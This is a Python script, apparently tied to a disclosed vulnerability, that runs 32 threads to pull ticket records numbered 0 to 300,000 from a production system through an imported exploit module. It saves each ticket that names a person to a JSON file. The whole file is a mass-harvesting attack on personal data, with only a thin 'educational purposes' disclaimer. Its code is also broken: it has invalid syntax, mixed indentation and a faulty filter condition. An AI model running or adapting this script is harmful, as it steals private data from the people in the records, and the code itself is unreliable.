# personal_data_downloader.py - Script that downloads every ticket that has personal info in it.

# This script executes and/or uses a disclosed exploit on a production system. Do not use the script unethically. It is published for educational purposes only.
# Code is published in the public domain. Check LICENSE file.


#------- CONFIG -------#
# How many threads to use
thread_count = 32

# How many tickets to download
lower_limit = 0
upper_limit = 300000

# Save to json?
save = False

#----------------------#
import exploit
import threading

class ThreadWorker:
    def __init__(self, threadnr:int, threads:int, upper_limit:int, lower_limit:int):
        self.threadnr = threadnr
        self.threads = threads
        self.ulimit = upper_limit
        self.count = (lower_limit + threadnr)
		self.save = global save
		
		# Not best practice maar enige manier om makkelijk multithreading te kunnen doen
        self.loop()


    def loop(self):
        while(self.count < self.ulimit):
            try:
                self.process()
            except:
                # Never stop!
                pass

            self.count += self.threads

    def process(self):
        print(f"Thread {self.threadnr}: Getting ticket {self.count}")
        t = exploit.GetTicket(self.count)
        
        if(t == None or t.name == None or t.name == "Paid Vehicle" or t.name == "Paid Person" and not self.save):
            del t
            return

        else:
            with open(f'json/{self.count}.json', 'w', encoding = 'utf-8') as f:
                f.write(str(t))
                f.close()
            return


if __name__ == "__main__":.
		global thread_count
		global upper_limit
		global lower_limit
        try:
            threads = []
            for index in range(thread_count):
                x = threading.Thread(target=ThreadWorker, args=(index, thread_count, upper_limit, lower_limit))
                threads.append(x)
                x.start()

        except KeyboardInterrupt:
            for t in threads:
                t._stop()
			exit(0)
